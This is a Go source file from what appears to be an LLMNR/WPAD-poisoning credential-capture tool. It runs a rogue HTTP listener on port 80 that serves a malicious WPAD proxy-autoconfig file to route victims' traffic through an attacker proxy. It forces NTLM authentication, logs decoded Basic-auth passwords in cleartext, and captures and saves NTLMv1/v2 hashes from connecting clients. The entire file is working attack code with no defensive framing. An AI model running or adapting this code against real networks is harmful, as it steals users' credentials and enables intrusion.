package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
)

// Per-connection NTLM state: store the challenge we issued so we can verify type3.
var connChallenges sync.Map // key: remoteAddr string, value: [8]byte

func serveHTTP(ifaceIP net.IP) {
	mux := http.NewServeMux()
	if wpadEnabled {
		mux.HandleFunc("/wpad.dat", handleWPAD)
		mux.HandleFunc("/wpad/wpad.dat", handleWPAD)
		mux.HandleFunc("/proxy.pac", handleWPAD)
	}
	mux.HandleFunc("/", handleHTTPNTLM)

	addr := fmt.Sprintf("%s:80", ifaceIP)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		logError("HTTP listen %s — %v (need root?)", addr, err)
		return
	}
	logInfo("HTTP listening on %s:80", ifaceIP)
	if wpadEnabled {
		logInfo("WPAD  serving PAC file at http://%s/wpad.dat (proxy: %s)", ifaceIP, wpadProxyHost)
	}
	http.Serve(ln, mux)
}

// handleWPAD serves a WPAD PAC file that routes all traffic through our proxy.
func handleWPAD(w http.ResponseWriter, r *http.Request) {
	logInfo("[WPAD] PAC file requested by %s", r.RemoteAddr)
	proxy := wpadProxyHost
	if proxy == "" {
		host, _, _ := net.SplitHostPort(r.Host)
		if host == "" {
			host = r.Host
		}
		proxy = fmt.Sprintf("%s:3128", host)
	}
	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
    if (isInNet(host, "127.0.0.0", "255.0.0.0")) { return "DIRECT"; }
    return "PROXY %s; DIRECT";
}
`, proxy)
	w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(pac)))
	w.WriteHeader(200)
	w.Write([]byte(pac))
}

func handleHTTPNTLM(w http.ResponseWriter, r *http.Request) {
	io.Copy(io.Discard, r.Body)

	auth := r.Header.Get("Authorization")

	if auth == "" {
		logVerbose("HTTP connection from %s — sending NTLM negotiate", r.RemoteAddr)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)
		return
	}

	// Basic auth — capture cleartext credentials
	if strings.HasPrefix(strings.ToUpper(auth), "BASIC ") {
		decoded, err := base64.StdEncoding.DecodeString(auth[6:])
		if err == nil {
			logSuccess("[HTTP] Basic auth cleartext from %s: %s", r.RemoteAddr, string(decoded))
		}
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	if !strings.HasPrefix(strings.ToUpper(auth), "NTLM ") {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	raw, err := base64.StdEncoding.DecodeString(auth[5:])
	if err != nil {
		w.WriteHeader(400)
		return
	}

	ntlm := FindNTLMSSP(raw)
	if len(ntlm) < 12 {
		w.WriteHeader(400)
		return
	}

	switch ntlmMsgType(ntlm) {
	case 1: // NTLMSSP_NEGOTIATE → issue challenge
		ws, dom, osVer := ParseNTLMNegotiate(ntlm)
		if ws != "" || dom != "" {
			logVerbose("HTTP NTLM Type1 from %s — workstation=%s domain=%s os=%s", r.RemoteAddr, ws, dom, osVer)
		} else {
			logVerbose("HTTP NTLM Type1 from %s — issuing challenge", r.RemoteAddr)
		}
		challenge := getChallenge()
		connChallenges.Store(r.RemoteAddr, challenge)
		ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
		encoded := base64.StdEncoding.EncodeToString(ntlmChallenge)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(401)

	case 3: // NTLMSSP_AUTHENTICATE → capture hash
		val, ok := connChallenges.Load(r.RemoteAddr)
		if !ok {
			w.WriteHeader(401)
			return
		}
		challenge := val.([8]byte)
		connChallenges.Delete(r.RemoteAddr)

		hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
		if err != nil {
			logVerbose("HTTP NTLM parse: %v", err)
			w.WriteHeader(401)
			return
		}
		proto := "NTLMv2"
		if lmMode {
			proto = "NTLMv1"
		}
		logSuccess("[HTTP] %s captured from %s", proto, r.RemoteAddr)
		logSuccess("       %s\\%s", domain, user)
		logSuccess("       %s", hash)
		saveHash(hash)
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)

	default:
		w.WriteHeader(400)
	}
}
